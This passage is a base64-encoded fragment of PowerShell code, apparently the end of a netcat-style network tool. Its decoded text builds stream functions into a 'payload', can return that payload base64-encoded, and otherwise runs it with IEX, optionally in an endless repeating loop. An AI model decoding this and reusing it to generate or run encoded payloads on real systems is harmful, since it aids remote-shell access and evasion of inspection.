bjpSZWFkRGF0YV9Db25zb2xlfSArICJgbn1gbmBuIikKICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfV3JpdGVEYXRhYG57YG4iICsgJHtmdW5jdGlvbjpXcml0ZURhdGFfQ29uc29sZX0gKyAiYG59YG5gbiIpCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9Db25zb2xlfSArICJgbn1gbmBuIikKICAgICRJbnZva2VTdHJpbmcgKz0gKCJAKCciICsgJG8gKyAiJykiKQogIH0KICAKICBpZigkZXApeyRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIE1haW5gbntgbiIgKyAke2Z1bmN0aW9uOk1haW5fUG93ZXJzaGVsbH0gKyAiYG59YG5gbiIpfQogIGVsc2V7JEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gTWFpbmBue2BuIiArICR7ZnVuY3Rpb246TWFpbn0gKyAiYG59YG5gbiIpfQogICRJbnZva2VTdHJpbmcgPSAoJEZ1bmN0aW9uU3RyaW5nICsgJEludm9rZVN0cmluZykKICAjIyMjIyMjIyMjIEdFTkVSQVRFIFBBWUxPQUQgIyMjIyMjIyMjIwogIAogICMjIyMjIyMjIyMgUkVUVVJOIEdFTkVSQVRFRCBQQVlMT0FEUyAjIyMjIyMjIyMjCiAgaWYoJGdlKXtXcml0ZS1WZXJib3NlICJSZXR1cm5pbmcgRW5jb2RlZCBQYXlsb2FkLi4uIiA7IHJldHVybiBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0Qnl0ZXMoJEludm9rZVN0cmluZykpfQogIGVsc2VpZigkZyl7V3JpdGUtVmVyYm9zZSAiUmV0dXJuaW5nIFBheWxvYWQuLi4iIDsgcmV0dXJuICRJbnZva2VTdHJpbmd9CiAgIyMjIyMjIyMjIyBSRVRVUk4gR0VORVJBVEVEIFBBWUxPQURTICMjIyMjIyMjIyMKICAKICAjIyMjIyMjIyMjIEVYRUNVVElPTiAjIyMjIyMjIyMjCiAgJE91dHB1dCA9ICRudWxsCiAgdHJ5CiAgewogICAgaWYoJHJlcCkKICAgIHsKICAgICAgd2hpbGUoJFRydWUpCiAgICAgIHsKICAgICAgICAkT3V0cHV0ICs9IElFWCAkSW52b2tlU3RyaW5nCiAgICAgICAgU3RhcnQtU2xlZXAgLXMgMgogICAgICAgIFdyaXRlLVZlcmJvc2UgIlJlcGV0aXRpb24gRW5hYmxlZDogUmVzdGFydGluZy4uLiIKICAgICAgfQogICAgfQogICAgZWxzZQogICAgewogICAgICAkT3V0cHV0ICs9IElFWCAkSW52b2tlU3RyaW5nCiAgICB9CiAgfQogIGZpbmFsbHkKICB7CiAgICBpZigkT3V0cHV0IC1uZSAkbnVsbCkKICAgIHsKICAgICAgaWYoJG9mIC1lcSAiIil7JE91dHB1dH0KICAgICAgZWxzZXtbaW8uZmlsZV06OldyaXRlQWxsQnl0ZXMoJG9mLCRPdXRwdXQpfQogICAgfQogIH0KICAjIyMjIyMjIyMjIEVYRUNVVElPTiAjIyMjIyMjIyMjCn0K
